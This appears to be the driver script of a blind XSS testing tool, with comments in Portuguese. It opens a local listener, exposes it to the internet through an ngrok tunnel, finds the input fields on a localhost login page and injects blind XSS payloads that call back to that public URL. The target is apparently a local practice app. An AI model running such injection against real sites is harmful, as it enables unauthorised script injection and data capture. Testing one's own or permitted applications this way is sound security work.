from src.modules.server_ouvinte import iniciar_servidor_ouvinte
from pyngrok import ngrok
from src.modules.xss import get_rendered_html, find_tags, blind_xss_injection, eco_test

# Configuração de Tags para encontrar campos de entrada
TAGS_TO_FIND = ['input', 'form', 'textarea', 'select']

# Configurações do servidor ouvinte
porta = 8000

# Inicia o servidor ouvinte em uma thread separada
iniciar_servidor_ouvinte(porta)

# Cria o túnel ngrok para expor o servidor local
ngrok_tunnel = ngrok.connect(porta)
url_ouvinte = ngrok_tunnel.public_url
print(f"[*] Servidor ouvinte exposto em: {url_ouvinte}")

# Exemplo de uso do Blind XSS
driver = get_rendered_html("http://localhost:3000/#/login")
if driver:
    html = driver.page_source
    found_tags = find_tags(html, TAGS_TO_FIND)
    
    # Teste de eco com os campos encontrados
    eco_results = eco_test(found_tags, driver, "TEXTPASSIVE")
    successful_results = [result for result in eco_results if result['status'] == 'success']

    # Teste de Blind XSS com os campos encontrados pelo teste de eco que foram categorizadas como sucesso
    blind_xss_results = blind_xss_injection(successful_results, driver, url_ouvinte)
    print(blind_xss_results)

    driver.quit()

# Mantém o servidor ouvinte ativo por um tempo para capturar requisições
try:
    print("[*] Servidor ouvinte ativo. Pressione Ctrl+C para encerrar.")
    while True:
        pass
except KeyboardInterrupt:
    print("[*] Encerrando servidor ouvinte...")
    ngrok.disconnect(url_ouvinte)


    